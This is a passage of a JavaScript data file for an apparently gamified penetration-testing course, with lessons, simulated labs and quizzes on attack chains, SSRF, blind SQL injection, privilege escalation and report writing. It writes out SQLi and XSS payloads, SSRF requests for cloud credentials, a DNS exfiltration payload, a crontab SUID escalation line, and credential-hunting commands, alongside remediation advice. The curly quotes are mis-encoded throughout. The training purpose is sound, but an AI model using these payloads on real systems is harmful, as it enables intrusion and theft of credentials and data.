{id:â€œa2â€,title:â€œChained Web Exploitsâ€,desc:â€œCombine vulnerabilities for maximum impactâ€,levels:[
{id:â€œa2l1â€,title:â€œAttack Chainsâ€,rounds:[
{type:â€œteachâ€,text:â€œReal attacks chain multiple vulns. SSRF \u2192 internal access. XSS \u2192 session steal \u2192 admin takeover. SQLi \u2192 file read \u2192 SSH key \u2192 shell. One bug alone might be medium severity, but chained together = critical.â€},
{type:â€œscenarioâ€,situation:â€œYou found reflected XSS on a support page and know an admin reviews support tickets.â€,q:â€œHow do you chain this into an account takeover?â€,opts:[â€œInject XSS that steals adminâ€™s session cookie when they view the ticketâ€,â€œReport the XSS and move onâ€,â€œUse the XSS to deface the pageâ€,â€œBrute-force the admin password insteadâ€],a:â€œInject XSS that steals adminâ€™s session cookie when they view the ticketâ€,why:â€œStored XSS in a ticket the admin reads = automatic session theft. XSS alone is medium, but chained to admin takeover itâ€™s critical.â€},
{type:â€œscenarioâ€,situation:â€œYou found SSRF on an internal tool. The server can make requests to internal IPs. AWS metadata is at 169.254.169.254.â€,q:â€œWhat do you target with the SSRF?â€,opts:[â€œAWS metadata endpoint for IAM credentialsâ€,â€œGoogle.com to test connectivityâ€,â€œThe company homepageâ€,â€œA random external IPâ€],a:â€œAWS metadata endpoint for IAM credentialsâ€,why:â€œSSRF to AWS metadata = IAM credentials = access to S3 buckets, databases, everything.â€}
]},
{id:â€œa2l2â€,title:â€œSSRF Exploitationâ€,rounds:[
{type:â€œteachâ€,text:â€œServer-Side Request Forgery: trick the server into making requests for you. Change URL parameters to internal IPs. Target: cloud metadata (169.254.169.254), internal services, localhost admin panels.â€},
{type:â€œhackâ€,story:â€œApex Financialâ€™s PDF generator fetches URLs to convert to PDF. You control the URL parameter.â€,q:â€œExploit SSRF to access AWS metadata.â€,a:[â€œhttp://169.254.169.254/latest/meta-data/â€,â€œ~169.254.169.254â€,â€œ~metadataâ€,â€œcurl http://169.254.169.254/latest/meta-data/iam/security-credentials/â€],output:â€{\n  "AccessKeyId": "AKIA4EXAMPLE",\n  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENGâ€¦",\n  "Token": "FwoGZXIvYXdzEBYâ€¦",\n  "Expiration": "2025-03-15T12:00:00Z"\n}â€,success:â€œAWS IAM credentials stolen via SSRF! Full cloud access.â€,why:â€œCloud metadata endpoints are the #1 SSRF target. They return temporary credentials.â€}
]},
{id:â€œa2labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Chain Attackâ€,rounds:[
{type:â€œlabâ€,title:â€œChain Attack on Apexâ€,objective:â€œChain multiple vulnerabilities to fully compromise Apex Financial.â€,banner:â€œApex Financial Pentest - Phase 2\nYouâ€™ve completed recon. Time to exploit.\nâ€,steps:[
{hint:â€œTest the login page for SQL injection.â€,accept:[â€~â€™ ORâ€,â€œ~sqlmapâ€,â€œ~sqlâ€,â€â€™ OR 1=1â€“â€],output:â€œPayload: adminâ€™ OR 1=1â€“\nResponse: Welcome, admin!\n\nBypass successful. Admin dashboard loaded.â€,successMsg:â€œSQLi login bypass! Youâ€™re in the admin panel.â€,example:â€â€™ OR 1=1â€“â€,quickCmds:[â€â€™ OR 1=1â€“â€]},
{hint:â€œThe admin panel has a â€˜Generate Reportâ€™ feature with a URL field. Test for SSRF.â€,accept:[â€œ~169.254â€,â€œ~metadataâ€,â€œ~ssrfâ€,â€œhttp://169.254.169.254/latest/meta-data/â€],output:â€œReport generated!\nContent: {\n  "AccessKeyId": "AKIA4APEXâ€¦",\n  "SecretAccessKey": "Nq4+3xâ€¦"\n}â€,successMsg:â€œSSRF confirmed! AWS credentials extracted from the report generator.â€,example:â€œhttp://169.254.169.254/latest/meta-data/â€,quickCmds:[â€œhttp://169.254.169.254/latest/meta-data/â€]},
{hint:â€œUse the stolen AWS credentials to list S3 buckets.â€,accept:[â€œaws s3 lsâ€,â€œ~aws s3â€,â€œ~s3 lsâ€],output:â€œ2024-01-15 apex-backups\n2024-03-20 apex-customer-data\n2024-06-01 apex-internal-docs\n2024-09-10 apex-financial-recordsâ€,successMsg:â€œ4 S3 buckets accessible! Customer data and financial records.â€,example:â€œaws s3 lsâ€,quickCmds:[â€œaws s3 lsâ€]},
{hint:â€œDownload evidence from the customer data bucket.â€,accept:[â€œaws s3 ls s3://apex-customer-dataâ€,â€œ~s3.*customerâ€,â€œaws s3 cp s3://apex-customer-data/export.csv .â€],output:â€œ2024-12-01 customers_full.csv (45MB)\n2024-11-15 credit_cards_encrypted.csv (12MB)\n2024-10-30 ssn_records.csv (8MB)\n\nTotal: 150,000+ customer records exposed.â€,successMsg:â€œFull customer database in S3. SQLi \u2192 SSRF \u2192 AWS \u2192 Data breach. Critical chain.â€,example:â€œaws s3 ls s3://apex-customer-dataâ€,quickCmds:[â€œaws s3 ls s3://apex-customer-dataâ€]}
]}
]},
{id:â€œa2mâ€,title:â€\uD83C\uDFC6 Web Exploits III Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œpickâ€,q:â€œSSRF to cloud metadata gives you:â€,opts:[â€œTemporary AWS/cloud credentialsâ€,â€œThe serverâ€™s source codeâ€,â€œDatabase passwords directlyâ€,â€œSSH keysâ€],a:â€œTemporary AWS/cloud credentialsâ€,why:â€œCloud metadata endpoints return IAM credentials for the serverâ€™s role.â€},
{type:â€œscenarioâ€,situation:â€œYou found XSS + admin ticket review + no HttpOnly on session cookies.â€,q:â€œSeverity when chained?â€,opts:[â€œCritical \u2014 admin account takeoverâ€,â€œMedium \u2014 just XSSâ€,â€œLow \u2014 needs user interactionâ€,â€œInformationalâ€],a:â€œCritical \u2014 admin account takeoverâ€,why:â€œXSS alone is medium. But chained to admin session theft, itâ€™s critical.â€},
{type:â€œpickâ€,q:â€œSQLi \u2192 SSRF \u2192 AWS creds \u2192 S3 access is an example of:â€,opts:[â€œAttack chainingâ€,â€œSocial engineeringâ€,â€œBrute forcingâ€,â€œDenial of serviceâ€],a:â€œAttack chainingâ€,why:â€œEach vulnerability enables the next. Individual medium bugs become a critical chain.â€},
{type:â€œtypeâ€,q:â€œAccess AWS metadata via SSRF:â€,a:[â€œhttp://169.254.169.254/latest/meta-data/â€,â€œcurl http://169.254.169.254/latest/meta-data/â€],why:â€œ169.254.169.254 is the standard cloud metadata IP.â€}
]}
]},
{id:â€œa3â€,title:â€œAdvanced Injectionâ€,desc:â€œBlind, out-of-band, and filter evasionâ€,levels:[
{id:â€œa3l1â€,title:â€œOut-of-Band Techniquesâ€,rounds:[
{type:â€œteachâ€,text:â€œWhen you canâ€™t see output directly, use out-of-band (OOB). DNS exfiltration: inject a payload that makes the server resolve YOUR domain. If you see the DNS query, the injection worked. Burp Collaborator and interactsh detect these callbacks.â€},
{type:â€œscenarioâ€,situation:â€œA search field is injectable but shows no output and has no time delay. Traditional boolean and time-based blind SQLi both fail.â€,q:â€œWhat technique to try next?â€,opts:[â€œOut-of-band via DNS exfiltrationâ€,â€œGive up, itâ€™s not injectableâ€,â€œTry harder with time-basedâ€,â€œSwitch to XSSâ€],a:â€œOut-of-band via DNS exfiltrationâ€,why:â€œOOB uses a side channel. The server makes a DNS request to your domain, confirming injection.â€},
{type:â€œpickâ€,q:â€œDNS exfiltration works by:â€,opts:[â€œMaking the target server resolve an attacker-controlled domainâ€,â€œStealing DNS zone filesâ€,â€œPoisoning DNS cacheâ€,â€œBlocking DNS lookupsâ€],a:â€œMaking the target server resolve an attacker-controlled domainâ€,why:â€œIf the server queries YOUR domain, you see it in your DNS logs. Confirms code execution.â€}
]},
{id:â€œa3l2â€,title:â€œWAF Bypass Labâ€,rounds:[
{type:â€œteachâ€,text:â€œModern WAFs block basic payloads. Advanced bypasses: Unicode normalization, HTTP parameter pollution, chunked encoding, nested encoding, and using lesser-known SQL functions. Test every bypass systematically.â€},
{type:â€œhackâ€,story:â€œApex Financial has a WAF blocking all standard SQLi and XSS. You need to get creative.â€,q:â€œBypass the WAF with an encoded XSS payload.â€,a:[â€<img src=x onerror=alert(1)>â€,â€<svg onload=alert(1)>â€,â€<details open ontoggle=alert(1)>â€,â€œ~img.*onerrorâ€,â€œ~svg.*onloadâ€],output:â€œWAF Log: Standard <script> blocked\nPayload: <svg/onload=alert(1)>\nResult: Alert triggered!\n\nThe WAF only filters <script> tags, not event handlers.â€,success:â€œWAF bypassed! Event handler-based XSS works when script tags are blocked.â€,why:â€œWAFs pattern-match known payloads. Alternative tags and event handlers often slip through.â€}
]},
{id:â€œa3labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Blind Extractionâ€,rounds:[
{type:â€œlabâ€,title:â€œBlind Data Extractionâ€,objective:â€œExtract the admin password through blind SQL injection without seeing any output.â€,banner:â€œTarget: search.apex.com\nThe search is injectable but fully blind.\nNo errors, no output, no time functions.\nâ€,steps:[
{hint:â€œSet up a DNS callback listener.â€,accept:[â€œinteractsh-clientâ€,â€œ~interactâ€,â€œ~collaboratorâ€,â€œ~burp.*collabâ€],output:â€œinteractsh-client started\nYour domain: abc123.interact.sh\nListening for callbacksâ€¦â€,successMsg:â€œCallback listener ready. Now inject a payload that triggers DNS.â€,example:â€œinteractsh-clientâ€,quickCmds:[â€œinteractsh-clientâ€]},
{hint:â€œInject OOB payload to confirm injection.â€,accept:[â€œ~LOAD_FILEâ€,â€œ~INTO OUTFILEâ€,â€œ~dnsâ€,â€â€™ UNION SELECT LOAD_FILE(CONCAT(â€™\\\\â€™,version(),â€™.abc123.interact.sh\\\\aâ€™))â€“â€],output:â€œDNS callback received!\nQuery: 5.7.42.abc123.interact.sh\n\nMySQL version: 5.7.42â€,successMsg:â€œOOB confirmed! The database version came through DNS.â€,example:â€â€™ UNION SELECT LOAD_FILE(â€¦)â€,quickCmds:[â€œinject OOB payloadâ€]},
{hint:â€œExtract the admin password character by character via DNS.â€,accept:[â€œ~extractâ€,â€œ~charâ€,â€œ~substringâ€,â€œ~SUBSTRâ€],output:â€œExtracting admin password via DNS callbacksâ€¦\nChar 1: S (DNS: S.abc123.interact.sh)\nChar 2: u (DNS: Su.abc123.interact.sh)\nâ€¦\nFull password: Sup3r_S3cure_2024!â€,successMsg:â€œFull admin password extracted through DNS! Pure blind extraction.â€,example:â€œautomated OOB extractionâ€,quickCmds:[â€œextract via DNSâ€]}
]}
]},
{id:â€œa3mâ€,title:â€\uD83C\uDFC6 Injection III Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œpickâ€,q:â€œOut-of-band exfiltration uses:â€,opts:[â€œSide channels like DNS to extract dataâ€,â€œDirect page outputâ€,â€œTime delaysâ€,â€œError messagesâ€],a:â€œSide channels like DNS to extract dataâ€,why:â€œOOB sends data through DNS queries to an attacker-controlled domain.â€},
{type:â€œpickâ€,q:â€œIf <script> is blocked by a WAF, try:â€,opts:[â€œEvent handlers on other tags like <svg onload>â€,â€œGiving up on XSSâ€,â€œOnly <script> with different caseâ€,â€œRemoving the payloadâ€],a:â€œEvent handlers on other tags like <svg onload>â€,why:â€œWAFs often only block <script>. Event handlers on img, svg, details tags bypass this.â€},
{type:â€œscenarioâ€,situation:â€œNo errors, no output changes, no time functions available.â€,q:â€œWhich injection technique still works?â€,opts:[â€œOut-of-band via DNSâ€,â€œBoolean-based blindâ€,â€œTime-based blindâ€,â€œError-basedâ€],a:â€œOut-of-band via DNSâ€,why:â€œWhen all other channels are blocked, OOB uses DNS as an alternative data channel.â€}
]}
]}
]};

var SEC11 = {
id:â€œs11â€,title:â€œAdvanced Exploitationâ€,tier:â€œadvancedâ€,icon:â€\uD83D\uDD25â€,color:â€œvar(â€“purple)â€,
units:[
{id:â€œa4â€,title:â€œFull Exploitation Chainsâ€,desc:â€œInitial access to domain adminâ€,levels:[
{id:â€œa4l1â€,title:â€œInitial Access Methodsâ€,rounds:[
{type:â€œteachâ€,text:â€œCommon initial access: phishing with malicious attachments, exploiting public-facing apps (web shells, known CVEs), password spraying external services (VPN, OWA, RDP). Choose based on the attack surface.â€},
{type:â€œscenarioâ€,situation:â€œTarget has: Outlook Web Access (OWA), a VPN portal, a WordPress blog (v5.8), and SSH on a dev server.â€,q:â€œBest initial access vector?â€,opts:[â€œExploit known WordPress 5.8 CVEsâ€,â€œPhish the CEOâ€,â€œBrute-force SSHâ€,â€œDDoS the VPNâ€],a:â€œExploit known WordPress 5.8 CVEsâ€,why:â€œWordPress 5.8 has known exploits. Itâ€™s the fastest path that doesnâ€™t require social engineering.â€},
{type:â€œscenarioâ€,situation:â€œYouâ€™ve gained a low-privilege shell on the WordPress server. Apache user (www-data). The server is in the DMZ.â€,q:â€œFirst three things to do?â€,opts:[â€œEnumerate users, check SUID, look for credentialsâ€,â€œImmediately try kernel exploitsâ€,â€œDelete logs to cover tracksâ€,â€œScan the entire internal network loudlyâ€],a:â€œEnumerate users, check SUID, look for credentialsâ€,why:â€œMethodical enumeration first. Kernel exploits are noisy and might crash the box.â€}
]},
{id:â€œa4l2â€,title:â€œPost-Exploitationâ€,rounds:[
{type:â€œteachâ€,text:â€œAfter shell access: stabilize your shell, enumerate everything, find credentials, establish persistence. Grab /etc/shadow, .bash_history, config files, SSH keys, browser saved passwords. Leave no stone unturned.â€},
{type:â€œtypeâ€,q:â€œSearch for passwords in config files:â€,a:[â€œgrep -ri â€˜passwordâ€™ /etc/ /var/www/ /opt/â€,â€œgrep -ri â€˜pass\|secret\|keyâ€™ /etc/ /var/www/â€],why:â€œConfig files are the #1 source of credentials on compromised systems.â€},
{type:â€œtypeâ€,q:â€œCheck bash history for leaked commands:â€,a:[â€œcat ~/.bash_historyâ€,â€œcat /home/*/.bash_historyâ€,â€œhistoryâ€],why:â€œUsers type passwords in commands: mysql -pâ€™passwordâ€™, sshpass, curl with API keys.â€}
]},
{id:â€œa4labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Full Compromiseâ€,rounds:[
{type:â€œlabâ€,title:â€œFull Compromiseâ€,objective:â€œGo from zero access to domain admin on MegaCorpâ€™s network.â€,banner:â€œFINAL ENGAGEMENT: MegaCorp Corp\nScope: Full internal penetration test\nObjective: Domain Admin\nâ€,steps:[
{hint:â€œExploit the WordPress vulnerability for initial access.â€,accept:[â€œ~exploitâ€,â€œ~wordpressâ€,â€œ~wpscanâ€,â€œmsfconsole -q -x â€˜use exploit/unix/webapp/wp_admin_shell_uploadâ€™â€],output:â€[*] Uploading shellâ€¦\n[+] Shell uploaded to /wp-content/uploads/shell.php\n[*] Meterpreter session 1 opened\n\nmeterpreter > getuid\nServer username: www-dataâ€,successMsg:â€œInitial foothold! www-data shell on the WordPress server.â€,example:â€œmsf> use exploit/unix/webapp/wp_admin_shell_uploadâ€,quickCmds:[â€œuse wp_admin_shell_uploadâ€]},
{hint:â€œEnumerate for privilege escalation vectors.â€,accept:[â€œ~linpeasâ€,â€œ~enumâ€,â€œfind / -perm -4000 2>/dev/nullâ€,â€./linpeas.shâ€],output:â€[+] Writable /etc/crontab!\n[+] MySQL running as root with empty password\n[+] Found SSH key in /var/www/.ssh/id_rsa\n[+] Kernel 4.15 (DirtyCow candidate)â€,successMsg:â€œMultiple paths to root! Writable crontab is the easiest.â€,example:â€./linpeas.shâ€,quickCmds:[â€./linpeas.shâ€]},
{hint:â€œEscalate to root via the writable crontab.â€,accept:[â€œ~crontabâ€,â€œ~echo.*cronâ€,â€œecho â€™* * * * * root chmod +s /bin/bashâ€™ >> /etc/crontabâ€],output:â€œCrontab modified. Waiting 60 secondsâ€¦\n$ /bin/bash -p\nbash-5.0# whoami\nrootâ€,successMsg:â€œRoot on the web server! Now pivot to the internal network.â€,example:â€œecho â€™* * * * * root chmod +s /bin/bashâ€™ >> /etc/crontabâ€,quickCmds:[â€œecho payload >> /etc/crontabâ€]},
{hint:â€œPivot to the domain controller using found credentials.â€,accept:[â€œ~psexecâ€,â€œ~pivotâ€,â€œ~domainâ€,â€œpsexec.py admin:M3g4C0rp_2024!@10.0.0.5â€],output:â€œImpacket psexec\nConnecting to 10.0.0.5â€¦\nAuthentication successful!\n\nC:\Windows\system32> whoami\nmegacorp\administrator\n\nDomain Admin achieved.â€,successMsg:â€œDOMAIN ADMIN! Full MegaCorp compromise. Web shell \u2192 root \u2192 pivot \u2192 DA.â€,example:â€œpsexec.py admin:pass@DCâ€,quickCmds:[â€œpsexec.py admin:pass@10.0.0.5â€]}
]}
]},
{id:â€œa4mâ€,title:â€\uD83C\uDFC6 Exploitation III Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œpickâ€,q:â€œAfter getting a low-privilege shell, first priority is:â€,opts:[â€œEnumerate users, SUID, creds, networkâ€,â€œTry kernel exploits immediatelyâ€,â€œDelete all logsâ€,â€œScan the internet from the targetâ€],a:â€œEnumerate users, SUID, creds, networkâ€,why:â€œMethodical enumeration finds the safest escalation path. Kernel exploits are a last resort.â€},
{type:â€œtypeâ€,q:â€œSearch for passwords across config files:â€,a:[â€œgrep -ri â€˜passwordâ€™ /etc/ /var/www/ /opt/â€,â€œgrep -ri â€˜passâ€™ /etc/ /var/www/â€],why:â€œConfig files constantly contain hardcoded credentials.â€},
{type:â€œtypeâ€,q:â€œCheck user command history for leaked secrets:â€,a:[â€œcat ~/.bash_historyâ€,â€œcat /home/*/.bash_historyâ€],why:â€œCommands often contain plaintext passwords and API keys.â€},
{type:â€œscenarioâ€,situation:â€œYou have root on a DMZ web server. Internal network is 10.0.0.0/24. You found domain admin creds in a config file.â€,q:â€œFinal step to full compromise?â€,opts:[â€œUse psexec/wmiexec to authenticate to the domain controllerâ€,â€œScan every port on every hostâ€,â€œSet up a crypto minerâ€,â€œEmail the IT teamâ€],a:â€œUse psexec/wmiexec to authenticate to the domain controllerâ€,why:â€œWith DA creds, psexec gives you a shell on the DC. Game over.â€}
]}
]},
{id:â€œa5â€,title:â€œReporting & Methodologyâ€,desc:â€œWrite findings that get bugs fixedâ€,levels:[
{id:â€œa5l1â€,title:â€œVulnerability Scoringâ€,rounds:[
{type:â€œteachâ€,text:â€œCVSS scores rate severity: Critical (9-10), High (7-8.9), Medium (4-6.9), Low (0.1-3.9). Bug bounty programs pay based on severity. An SSRF reading local files might be High, but SSRF to AWS creds is Critical.â€},
{type:â€œpickâ€,q:â€œUnauthenticated RCE on a public-facing server is:â€,opts:[â€œCritical (9.0+)â€,â€œHigh (7.0)â€,â€œMedium (5.0)â€,â€œLow (2.0)â€],a:â€œCritical (9.0+)â€,why:â€œRemote Code Execution with no auth = full compromise. Always critical.â€},
{type:â€œscenarioâ€,situation:â€œYou found SQLi that only extracts non-sensitive table names from a test database with no real data.â€,q:â€œCVSS severity?â€,opts:[â€œMedium \u2014 SQLi exists but impact is limitedâ€,â€œCritical \u2014 all SQLi is criticalâ€,â€œLow \u2014 no real data exposedâ€,â€œInformational \u2014 not worth reportingâ€],a:â€œMedium \u2014 SQLi exists but impact is limitedâ€,why:â€œSQLi is always worth reporting, but with no sensitive data access, impact is medium not critical.â€}
]},
{id:â€œa5l2â€,title:â€œWriting Reportsâ€,rounds:[
{type:â€œteachâ€,text:â€œGood report structure: Title, Severity, Description, Steps to Reproduce, Impact, Remediation. Be specific: â€˜SQLi in /api/search parameter qâ€™ not â€˜found SQL injectionâ€™. Include screenshots and HTTP requests. Show impact clearly.â€},
{type:â€œorderâ€,q:â€œOrder a vulnerability report correctly:â€,items:[â€œTitle & Severityâ€,â€œDescription of the vulnerabilityâ€,â€œSteps to reproduceâ€,â€œProof of concept / evidenceâ€,â€œBusiness impactâ€,â€œRecommended fixâ€],why:â€œClear structure helps developers understand and fix the issue quickly.â€},
{type:â€œpickâ€,q:â€œWhich report title is better?â€,opts:[â€œBlind SQLi in /api/v1/users?id= parameter allows full DB extractionâ€,â€œFound SQL injectionâ€,â€œSecurity issue on the websiteâ€,â€œBug in the searchâ€],a:â€œBlind SQLi in /api/v1/users?id= parameter allows full DB extractionâ€,why:â€œSpecific title with location, type, and impact. Developers can find and fix it immediately.â€}
]},
{id:â€œa5labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Write a Reportâ€,rounds:[
{type:â€œlabâ€,title:â€œWrite a Bug Reportâ€,objective:â€œDocument the Apex Financial attack chain as a professional pentest report.â€,banner:â€œEngagement complete. Document your findings.\nYou found: SQLi, SSRF, AWS credential theft.\nâ€,steps:[
{hint:â€œWhat severity rating for the SQLi \u2192 SSRF \u2192 AWS chain?â€,accept:[â€œcriticalâ€,â€œ~criticalâ€,â€œ~9â€,â€œ~10â€],output:â€œCVSS: 9.8 Critical\n\nJustification:\n- Network attack vector (no physical access needed)\n- No authentication required\n- Complete confidentiality impact (customer data)\n- Full integrity impact (can modify data)â€,successMsg:â€œCorrect! This chain is Critical \u2014 unauthenticated access to all customer data.â€,example:â€œCritical (9.8)â€,quickCmds:[â€œCriticalâ€]},
{hint:â€œWhatâ€™s the recommended fix for the SQLi?â€,accept:[â€œ~parameterizedâ€,â€œ~preparedâ€,â€œ~sanitizeâ€,â€œ~input validâ€,â€œparameterized queriesâ€],output:â€œRemediation:\n1. Use parameterized queries (prepared statements)\n2. Implement input validation\n3. Apply least-privilege DB accounts\n4. Deploy WAF as defense-in-depthâ€,successMsg:â€œParameterized queries eliminate SQLi at the root cause.â€,example:â€œparameterized queriesâ€,quickCmds:[â€œparameterized queriesâ€]},
{hint:â€œWhatâ€™s the fix for the SSRF?â€,accept:[â€œ~allowlistâ€,â€œ~whitelistâ€,â€œ~block.*internalâ€,â€œ~validate.*urlâ€,â€œURL allowlistingâ€],output:â€œRemediation:\n1. Allowlist permitted URL schemes and domains\n2. Block requests to internal/private IPs\n3. Disable unnecessary URL fetching\n4. Use a dedicated service for URL processingâ€,successMsg:â€œURL allowlisting prevents SSRF by only permitting approved destinations.â€,example:â€œURL allowlistingâ€,quickCmds:[â€œURL allowlistingâ€]}
]}
]},
{id:â€œa5mâ€,title:â€\uD83C\uDFC6 Reporting Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œpickâ€,q:â€œUnauthenticated RCE severity:â€,opts:[â€œCritical (9.0+)â€,â€œHigh (7.0)â€,â€œMedium (5.0)â€,â€œLowâ€],a:â€œCritical (9.0+)â€,why:â€œRCE with no auth is always critical.â€},
{type:â€œorderâ€,q:â€œOrder a bug report:â€,items:[â€œTitle & Severityâ€,â€œSteps to reproduceâ€,â€œProof of conceptâ€,â€œImpact statementâ€,â€œRemediationâ€],why:â€œStructured reports get bugs fixed faster.â€},
{type:â€œpickâ€,q:â€œThe root fix for SQL injection is:â€,opts:[â€œParameterized queriesâ€,â€œInput length limitsâ€,â€œA WAFâ€,â€œRate limitingâ€],a:â€œParameterized queriesâ€,why:â€œPrepared statements separate code from data, eliminating injection entirely.â€},
{type:â€œpickâ€,q:â€œThe root fix for SSRF is:â€,opts:[â€œURL allowlistingâ€,â€œBlocking port 80â€,â€œAdding CAPTCHAâ€,â€œEncrypting URLsâ€],a:â€œURL allowlistingâ€,why:â€œOnly permit requests to approved domains/IPs. Block all internal addresses.â€}
]}
]}
]};

// =============================================
// MASTERS SECTION - Final Certification
// 5 areas x 3 tests = 15 levels
// 100% required. Quizzes everything learned.
// =============================================

var SEC12 = {
id:â€œs12â€,title:â€œMasters: Foundations & Terminalâ€,tier:â€œmastersâ€,icon:â€\uD83C\uDFC6â€,color:â€œvar(â€“gold)â€,
units:[
{id:â€œm1â€,title:â€œTerminal Masteryâ€,desc:â€œEverything terminal, from basics to scriptsâ€,levels:[
{id:â€œm1t1â€,title:â€\uD83E\uDD47 Terminal Test 1â€,isMasters:true,rounds:[
{type:â€œtypeâ€,q:â€œList all files including hidden ones:â€,a:[â€œls -laâ€,â€œls -alâ€,â€œls -a -lâ€],why:â€œBasic but essential. -a shows hidden files, -l shows details.â€},
{type:â€œtypeâ€,q:â€œFind all files named â€˜*.confâ€™ on the system:â€,a:[â€œfind / -name â€™*.confâ€™â€,â€œfind / -name â€˜*.confâ€™ 2>/dev/nullâ€,â€œfind / -type f -name â€™*.confâ€™â€],why:â€œfind with -name searches by filename pattern from root.â€},
{type:â€œpickâ€,q:â€œWhat does chmod 755 do?â€,opts:[â€œOwner: read/write/execute. Group+Others: read/executeâ€,â€œEveryone gets full accessâ€,â€œOnly owner can readâ€,â€œNo one can access the fileâ€],a:â€œOwner: read/write/execute. Group+Others: read/executeâ€,why:â€œ7=rwx, 5=r-x. Owner full control, others can read and execute.â€},
{type:â€œtypeâ€,q:â€œSearch all files in /var for the word â€˜secretâ€™:â€,a:[â€œgrep -ri â€˜secretâ€™ /varâ€,â€œgrep -ri secret /varâ€],why:â€-r recursive, -i case insensitive. Searches file contents.â€},
{type:â€œbuildâ€,q:â€œExtract usernames from /etc/passwd:â€,parts:[â€œcutâ€,â€-d:â€,â€-f1â€,â€/etc/passwdâ€],answer:[â€œcutâ€,â€-d:â€,â€-f1â€,â€/etc/passwdâ€],why:â€œSplit by colon delimiter, take field 1.â€},
{type:â€œtypeâ€,q:â€œShow processes listening on network ports:â€,a:[â€œnetstat -tlnpâ€,â€œss -tlnpâ€,â€œnetstat -tulnpâ€],why:â€œReveals services and their ports. Essential for finding attack surface.â€}
]},
{id:â€œm1t2â€,title:â€\uD83E\uDD47 Terminal Test 2â€,isMasters:true,rounds:[
{type:â€œtypeâ€,q:â€œCopy a file to a remote server via SSH:â€,a:[â€œscp file.txt user@host:/path/â€,â€œscp file.txt user@target:/tmp/â€],why:â€œscp = secure copy over SSH.â€},
{type:â€œpickâ€,q:â€/etc/shadow contains:â€,opts:[â€œPassword hashes for all usersâ€,â€œSystem log filesâ€,â€œNetwork configurationâ€,â€œRunning processesâ€],a:â€œPassword hashes for all usersâ€,why:â€œShadow file stores hashed passwords. Only readable by root.â€},
{type:â€œtypeâ€,q:â€œCreate a directory and all parent directories:â€,a:[â€œmkdir -p /path/to/new/dirâ€,â€œmkdir -p path/to/dirâ€],why:â€-p creates parent directories if they donâ€™t exist.â€},
{type:â€œtypeâ€,q:â€œCheck the kernel version:â€,a:[â€œuname -râ€,â€œuname -aâ€,â€œcat /proc/versionâ€],why:â€œKernel version determines which exploits are available.â€},
{type:â€œpickâ€,q:â€œA SUID binary runs as:â€,opts:[â€œIts owner (usually root)â€,â€œThe current userâ€,â€œNobodyâ€,â€œThe group ownerâ€],a:â€œIts owner (usually root)â€,why:â€œSUID = Set User ID. Binary runs with ownerâ€™s privileges regardless of who calls it.â€},
{type:â€œtypeâ€,q:â€œFind all SUID binaries:â€,a:[â€œfind / -perm -4000 2>/dev/nullâ€,â€œfind / -perm -u=s 2>/dev/nullâ€],why:â€œSUID files are privilege escalation goldmines.â€}
]},
{id:â€œm1t3â€,title:â€\uD83E\uDD47 Terminal Test 3â€,isMasters:true,rounds:[
{type:â€œtypeâ€,q:â€œUpgrade a dumb shell to full TTY:â€,a:[â€œpython3 -c â€˜import pty;pty.spawn("/bin/bash")â€™â€,â€œpython -c â€˜import pty;pty.spawn("/bin/bash")â€™â€],why:â€œFull TTY enables interactive commands like sudo.â€},
{type:â€œbuildâ€,q:â€œBuild an SSH tunnel to an internal server:â€,parts:[â€œsshâ€,â€-Lâ€,â€œ8080:10.0.0.5:80â€,â€œuser@pivotâ€],answer:[â€œsshâ€,â€-Lâ€,â€œ8080:10.0.0.5:80â€,â€œuser@pivotâ€],why:â€œForwards local 8080 through pivot to internal server.â€},
{type:â€œtypeâ€,q:â€œCheck crontab for scheduled jobs:â€,a:[â€œcat /etc/crontabâ€,â€œcrontab -lâ€],why:â€œCron jobs with writable scripts = root execution.â€},
{type:â€œpickâ€,q:â€œPass-the-Hash lets you:â€,opts:[â€œAuthenticate using a hash without cracking itâ€,â€œSee all network trafficâ€,â€œEncrypt your connectionâ€,â€œCrack passwords fasterâ€],a:â€œAuthenticate using a hash without cracking itâ€,why:â€œNTLM accepts the hash directly. No plaintext password needed.â€},
{type:â€œtypeâ€,q:â€œCheck for reusable SSH keys:â€,a:[â€œls -la ~/.ssh/â€,â€œcat ~/.ssh/id_rsaâ€],why:â€œSSH keys grant access to other servers. Check known_hosts for targets.â€},
{type:â€œtypeâ€,q:â€œMake a script executable:â€,a:[â€œchmod +x script.shâ€,â€œchmod 755 script.shâ€],why:â€œScripts need execute permission to run.â€}
]}
]}
]};

var SEC13 = {
id:â€œs13â€,title:â€œMasters: Networking & Scanningâ€,tier:â€œmastersâ€,icon:â€\uD83C\uDFC6â€,color:â€œvar(â€“gold)â€,
units:[
{id:â€œm2â€,title:â€œNetwork Masteryâ€,desc:â€œIPs, ports, protocols, and scanningâ€,levels:[
{id:â€œm2t1â€,title:â€\uD83E\uDD47 Network Test 1â€,isMasters:true,rounds:[
{type:â€œpickâ€,q:â€œTCP port 443 runs:â€,opts:[â€œHTTPSâ€,â€œHTTPâ€,â€œSSHâ€,â€œFTPâ€],a:â€œHTTPSâ€,why:â€œ443 = HTTPS (encrypted web). 80 = HTTP, 22 = SSH, 21 = FTP.â€},
{type:â€œtypeâ€,q:â€œFind live hosts on a network:â€,a:[â€œnmap -sn 10.10.10.0/24â€,â€œnmap -sn 192.168.1.0/24â€],why:â€-sn = ping sweep. Finds live hosts without port scanning.â€},
{type:â€œtypeâ€,q:â€œRun a full version detection scan:â€,a:[â€œnmap -sV -sC targetâ€,â€œnmap -A targetâ€,â€œnmap -sV -sC 10.10.10.5â€],why:â€-sV detects versions, -sC runs default scripts. -A does both plus OS detection.â€},
{type:â€œpickâ€,q:â€œA SYN scan (-sS) is stealthy because:â€,opts:[â€œIt never completes the TCP handshakeâ€,â€œIt encrypts packetsâ€,â€œIt uses UDP insteadâ€,â€œItâ€™s slower than normalâ€],a:â€œIt never completes the TCP handshakeâ€,why:â€œSYN scan sends SYN, gets SYN-ACK, but sends RST instead of completing. No full connection logged.â€},
